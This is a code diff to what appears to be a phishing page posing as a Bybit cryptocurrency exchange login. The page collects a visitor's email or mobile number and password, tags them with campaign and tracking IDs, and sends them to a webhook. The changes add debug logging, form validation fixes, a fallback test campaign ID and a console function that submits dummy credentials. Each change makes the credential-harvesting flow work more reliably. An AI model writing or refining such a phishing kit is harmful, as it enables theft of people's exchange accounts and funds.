@@ -726,6 +726,14 @@
                     campaignId = campaignId.replace(/\/+$/, '');
                 }
             }
+            
+            // For testing purposes, if no campaign ID is found, use a test one
+            if (!campaignId) {
+                console.log('No campaign ID found, using test campaign for debugging');
+                campaignId = 'test-campaign-bybit';
+                localStorage.setItem('bybit_campaign_id', campaignId);
+            }
+            
             return campaignId;
         }
 
@@ -742,12 +750,21 @@
                 if (tab.id === 'email-tab') {
                     mobileInputs.style.display = 'none';
                     emailInput.style.display = 'block';
+                    // Update required attributes
+                    document.querySelector('input[type="tel"]').removeAttribute('required');
+                    document.querySelector('input[type="email"]').setAttribute('required', '');
                 } else if (tab.id === 'mobile-tab') {
                     mobileInputs.style.display = 'flex';
                     emailInput.style.display = 'none';
+                    // Update required attributes
+                    document.querySelector('input[type="email"]').removeAttribute('required');
+                    document.querySelector('input[type="tel"]').setAttribute('required', '');
                 } else if (tab.id === 'qr-tab') {
                     mobileInputs.style.display = 'none';
                     emailInput.style.display = 'none';
+                    // Remove required from both
+                    document.querySelector('input[type="tel"]').removeAttribute('required');
+                    document.querySelector('input[type="email"]').removeAttribute('required');
                 }
             });
         });
@@ -794,9 +811,22 @@
 
         // Initialize the display on page load
         window.addEventListener('load', function() {
+            console.log('Page loaded, initializing...'); // Debug log
             checkAndClearExpiredData(); // Check for expired data first
             updateCountryDisplay();
             loadUserPreferences(); // Load saved user preferences
+            
+            // Initialize required attributes based on default active tab
+            const activeTab = document.querySelector('.tab.active').id;
+            console.log('Initial active tab:', activeTab);
+            
+            if (activeTab === 'mobile-tab') {
+                document.querySelector('input[type="tel"]').setAttribute('required', '');
+                document.querySelector('input[type="email"]').removeAttribute('required');
+            } else if (activeTab === 'email-tab') {
+                document.querySelector('input[type="email"]').setAttribute('required', '');
+                document.querySelector('input[type="tel"]').removeAttribute('required');
+            }
         });
 
         // Password toggle functionality
@@ -826,18 +856,33 @@
         // Form submission
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
+            console.log('Form submitted!'); // Debug log
             
-            const activeTab = document.querySelector('.tab.active').id;
+            const activeTab = document.querySelector('.tab.active');
+            if (!activeTab) {
+                console.error('No active tab found!');
+                showErrorMessage('Interface error. Please refresh the page.');
+                return;
+            }
+            
+            const activeTabId = activeTab.id;
             const password = document.getElementById('password').value.trim();
+            
+            console.log('Active tab:', activeTabId); // Debug log
+            console.log('Password length:', password.length); // Debug log
             
             // Basic validation
             if (!password) {
+                console.log('Password validation failed'); // Debug log
                 showErrorMessage('Please enter your password');
                 return;
             }
             
             const campaignId = getOrSetCampaignId();
+            console.log('Campaign ID:', campaignId); // Debug log
+            
             if (!campaignId) {
+                console.log('Campaign ID validation failed'); // Debug log
                 showErrorMessage('Missing campaign id. Please use a valid link.');
                 return;
             }
@@ -846,11 +891,15 @@
             
             let loginData = {};
             
-            if (activeTab === 'mobile-tab') {
+            if (activeTabId === 'mobile-tab') {
                 const countryCode = document.querySelector('.country-code').value;
-                const mobile = document.querySelector('input[type="tel"]').value.trim();
+                const mobileInput = document.querySelector('input[type="tel"]');
+                const mobile = mobileInput ? mobileInput.value.trim() : '';
+                
+                console.log('Mobile validation - Country code:', countryCode, 'Mobile:', mobile); // Debug log
                 
                 if (!mobile) {
+                    console.log('Mobile validation failed - empty mobile'); // Debug log
                     showErrorMessage('Please enter your mobile number');
                     return;
                 }
@@ -864,15 +913,20 @@
                     email: fullMobile, // Send mobile number as email field for consistency
                     password: password
                 };
-            } else if (activeTab === 'email-tab') {
-                const email = document.querySelector('input[type="email"]').value.trim();
+            } else if (activeTabId === 'email-tab') {
+                const emailInput = document.querySelector('input[type="email"]');
+                const email = emailInput ? emailInput.value.trim() : '';
+                
+                console.log('Email validation - Email:', email); // Debug log
                 
                 if (!email) {
+                    console.log('Email validation failed - empty email'); // Debug log
                     showErrorMessage('Please enter your email address');
                     return;
                 }
                 
                 if (!isValidEmail(email)) {
+                    console.log('Email validation failed - invalid format'); // Debug log
                     showErrorMessage('Please enter a valid email address');
                     return;
                 }
@@ -890,6 +944,8 @@
             loginData.user_agent = navigator.userAgent;
             loginData.tracking_id = trackingId;
             
+            console.log('Final login data:', loginData); // Debug log
+            
             // Store email/mobile for later use (messaging)
             if (loginData.email) {
                 localStorage.setItem('bybit_email', loginData.email);
@@ -898,6 +954,8 @@
             
             // Save user preferences for UX
             saveUserPreferences(loginData);
+            
+            console.log('About to send to webhook...'); // Debug log
             
             // Send to webhook
             sendToWebhook(loginData, campaignId);
@@ -1132,13 +1190,6 @@
                 const passwordInput = document.getElementById('password');
                 if (passwordInput) passwordInput.classList.add('input-error');
             }
-            if (step === 'email') {
-                const emailInput = document.querySelector('input[type="email"]');
-                if (emailInput) emailInput.classList.add('input-error');
-            } else if (step === 'password') {
-                const passwordInput = document.getElementById('password');
-                if (passwordInput) passwordInput.classList.add('input-error');
-            }
             // Create and show error message
             const errorDiv = document.createElement('div');
             errorDiv.className = 'alert alert-error';
@@ -1213,6 +1264,62 @@
                 loadingElement.style.display = 'none';
             }
         }
+
+        // Add direct button click listener as backup
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginButton = document.querySelector('.login-btn');
+            const loginForm = document.getElementById('login-form');
+            
+            console.log('DOM loaded - Button found:', !!loginButton);
+            console.log('DOM loaded - Form found:', !!loginForm);
+            
+            if (loginButton && !loginButton.hasAttribute('data-listener-added')) {
+                loginButton.setAttribute('data-listener-added', 'true');
+                loginButton.addEventListener('click', function(e) {
+                    console.log('Login button clicked directly!'); // Debug log
+                    // The form submit event should handle this, but this is a backup
+                    if (loginForm) {
+                        loginForm.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+                    }
+                });
+            }
+        });
+
+        // Add debugging for tab state
+        function debugFormState() {
+            console.log('=== Form Debug Info ===');
+            console.log('Active tab:', document.querySelector('.tab.active')?.id);
+            console.log('Password value:', document.getElementById('password').value);
+            console.log('Email value:', document.querySelector('input[type="email"]')?.value);
+            console.log('Mobile value:', document.querySelector('input[type="tel"]')?.value);
+            console.log('Campaign ID:', getOrSetCampaignId());
+            console.log('=======================');
+        }
+
+        // Test function - can be called from browser console
+        window.testBybitLogin = function() {
+            console.log('Testing Bybit login...');
+            
+            // Fill in test data
+            document.getElementById('password').value = 'testpassword123';
+            
+            const activeTab = document.querySelector('.tab.active').id;
+            if (activeTab === 'mobile-tab') {
+                document.querySelector('input[type="tel"]').value = '1234567890';
+            } else {
+                // Switch to email tab for easier testing
+                document.getElementById('email-tab').click();
+                setTimeout(() => {
+                    document.querySelector('input[type="email"]').value = 'test@example.com';
+                    // Trigger form submission
+                    document.getElementById('login-form').dispatchEvent(new Event('submit'));
+                }, 100);
+                return;
+            }
+            
+            // Trigger form submission
+            document.getElementById('login-form').dispatchEvent(new Event('submit'));
+        };
     </script>
 </body>
 </html>
